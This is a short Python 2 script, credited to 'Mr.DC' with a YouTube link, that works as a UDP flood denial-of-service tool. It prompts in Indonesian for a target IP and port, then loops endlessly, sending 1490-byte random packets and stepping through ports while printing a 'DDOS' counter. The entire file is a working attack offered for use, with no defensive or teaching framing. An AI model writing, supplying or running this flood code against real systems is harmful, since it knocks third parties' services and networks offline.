import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print
print ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
print "Author   : Mr.DC"
print "You Tube : https://www.youtube.com/channel/UC65i9obO8PGARlIXsb274MA"
print "THx To   : Mr.DC && Mr.CDS16"
print ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
print
ip = raw_input("Masukkan IP Target : ")
port = input("Masukkan Port      : ")

os.system("clear")
print ":::::::::::::::::::::::"
print ":=======LOADING=======:"
print ":::::::::::::::::::::::"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "[[[NES::::ATTACK:::>>SEND %s DDOS TO  %s THROUGHT PORT:%s"%(sent,ip,port)
